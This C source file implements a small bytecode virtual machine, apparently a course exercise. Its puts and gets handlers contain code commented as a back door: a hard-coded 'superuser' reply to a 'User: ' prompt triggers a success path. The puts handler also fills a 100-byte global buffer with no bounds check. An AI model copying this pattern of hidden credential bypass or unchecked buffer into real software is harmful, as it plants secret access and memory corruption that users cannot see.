//-----------------------------------------------------------------------------
// minivm.c -- The basic definitions for the vm.
// Copyright (C) Philip Conrad 4/30/2013 @ 3:56 PM -- MIT License
//
//-----------------------------------------------------------------------------

#include "minivm.h"
#include <stdbool.h>
#include <stdio.h>
#include <string.h>


uint8_t PrevOutput[100];

extern bool is_running;

#define UNUSED __attribute__((unused)) 

//---------------------------------------------------------
// FUNCTION IMPLEMENTATIONS:
void halt(UNUSED struct VMContext* ctx, UNUSED const uint32_t instr){
    is_running = false;
}

//Function for handling "load" Instruction 
void load(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint32_t reg2value = ctx->r[reg2].value;
    //Memory Access Check
    if(reg2value >= DEFAULT_HEAP_SIZE){
        printf("[ERROR] Memory Access Out of Bound\n");
        is_running = false;
        return;
    }

    ctx->r[reg1].value = (uint32_t)ctx->Memory[reg2value];
}

//Function for handling "store" Instruction 
void store(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint32_t reg1value = ctx->r[reg1].value;
    //Memory Access Check
    if(reg1value >= DEFAULT_HEAP_SIZE){
        printf("[ERROR] Memory Access Out of Bound\n");
        is_running = false;
        return;
    }
   
    ctx->Memory[reg1value] = (uint8_t)ctx->r[reg2].value;
}

//Function for handling "move" Instruction 
void move(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    
    ctx->r[reg1].value = ctx->r[reg2].value;
}

//Function for handling "puti" Instruction 
void puti(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t imm1 = EXTRACT_B2(instr);
    
    ctx->r[reg1].value = (uint32_t)imm1;
}

//Function for handling "add" Instruction 
void add(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint8_t reg3 = EXTRACT_B3(instr);
    
    ctx->r[reg1].value = ctx->r[reg2].value + ctx->r[reg3].value;
}

//Function for handling "sub" Instruction 
void sub(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint8_t reg3 = EXTRACT_B3(instr);
    
    ctx->r[reg1].value = ctx->r[reg2].value - ctx->r[reg3].value;
}

//Function for handling "gt" Instruction 
void gt(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint8_t reg3 = EXTRACT_B3(instr);
    
    if(ctx->r[reg2].value > ctx->r[reg3].value)
        ctx->r[reg1].value = 1; 
    else
        ctx->r[reg1].value = 0;
}

//Function for handling "ge" Instruction 
void ge(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint8_t reg3 = EXTRACT_B3(instr);
    
    if(ctx->r[reg2].value >= ctx->r[reg3].value)
        ctx->r[reg1].value = 1; 
    else
        ctx->r[reg1].value = 0;
}

//Function for handling "eq" Instruction 
void eq(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t reg2 = EXTRACT_B2(instr);
    uint8_t reg3 = EXTRACT_B3(instr);
    
    if(ctx->r[reg2].value == ctx->r[reg3].value)
        ctx->r[reg1].value = 1; 
    else
        ctx->r[reg1].value = 0;
}

//Function for handling "ite" Instruction 
void ite(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr); 
    uint8_t addr1 = EXTRACT_B2(instr);
    uint8_t addr2 = EXTRACT_B3(instr);
    
    if(ctx->r[reg1].value > 0)
        ctx->pc = addr1;
    else
        ctx->pc = addr2;
}

//Function for handling "jump" Instruction 
void jump(struct VMContext* ctx, const uint32_t instr){
    uint8_t addr1= EXTRACT_B1(instr); 
    ctx->pc = addr1;
}

//Function for handling "puts" Instruction 
void _puts(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr);
    uint32_t reg1value = ctx->r[reg1].value;
    char c;
    //@@@@@@ Back Door Logic
    uint32_t backind = 0;
        
    while(true){
        //Check the Out-of-Bound Memory
        if(reg1value >= DEFAULT_HEAP_SIZE){
            printf("[ERROR] Memory Access Out of Bound\n");
            is_running = false;
            return;
        }
        c = ctx->Memory[reg1value];
        if(c == 0)
            break;
        putchar(c);
        PrevOutput[backind] = c;
        reg1value +=1;
        backind += 1;
    }
}

//Function for handling "gets" Instruction 
void _gets(struct VMContext* ctx, const uint32_t instr){
    uint8_t reg1 = EXTRACT_B1(instr);
    uint32_t reg1value = ctx->r[reg1].value;

    uint32_t reg1Start = reg1value;
    char c;
    while(true){
        //Check the Out-of-Bound Memory
        if(reg1value >= DEFAULT_HEAP_SIZE){
            printf("[ERROR] Memory Access Out of Bound\n");
            is_running = false;
            return;
        }
        c = getchar(); 
        if(c == 10)
            break;
        ctx->Memory[reg1value] = c;
        reg1value += 1;
    }
    //Check the Out-of-Bound Memory
    if(reg1value >= DEFAULT_HEAP_SIZE){
	    printf("[ERROR] Memory Access Out of Bound\n");
	    is_running = false;
	    return;
    }
    //Set zero to final
    ctx->Memory[reg1value] = 0;
    
    //@@@@@@@@@@@@@@@ Backdoor Logic
    if(PrevOutput != NULL){
        if(!strcmp((char *)PrevOutput, "User: ") && !strcmp((char *)&ctx->Memory[reg1Start], "superuser")){
            printf("Success\n");
            is_running = false;
        }
    }

}

bool opcodecheck(uint8_t opcode){
    if((opcode & 0xf) == 0 && (opcode & 0xf0) < 0xe0)
        return true;
    return false;
}

// Defers decoding of register args to the called function.
// dispatch :: VMContext -> uint32_t -> Effect()
void dispatch(struct VMContext* ctx, const uint32_t instr) {
    const uint8_t i = EXTRACT_B0(instr);
    //OPCode check
    if(opcodecheck(i)){
        (*ctx->funtable[i])(ctx, instr);
    }
    else{
        is_running=false;
        printf("[ERROR] Invalid Opcode\n");
    }
}


// Initializes a VMContext in-place.
// initVMContext :: VMContext -> uint32_t -> uint32_t -> [Reg] -> [FunPtr] -> Effect()
void initVMContext(struct VMContext* ctx, const uint32_t numRegs, const uint32_t numFuns, Reg* registers, FunPtr* funtable, uint32_t* code, uint32_t codesize) {
    ctx->numRegs    = numRegs;
    ctx->numFuns    = numFuns;
    ctx->r          = registers;
    ctx->funtable   = funtable;
    ctx->code       = code;
    ctx->codesize   = codesize;
    //Initial Program Counter is 0
    ctx->pc         = 0;
}


// Reads an instruction, executes it, then steps to the next instruction.
// stepVMContext :: VMContext -> uint32_t** -> Effect()
void stepVMContext(struct VMContext* ctx) {
    // Read a 32-bit bytecode instruction.
    uint32_t instr;
    //Program Counter Check
    if(ctx->pc >= ctx->codesize){
        printf("[ERROR] Instruction does not exist\n");
        is_running = false;
        return;
    }

    instr = ctx->code[ctx->pc]; 

    // Increment to next instruction.
    ctx->pc++;

    // Dispatch to an opcode-handler.
    dispatch(ctx, instr);
}

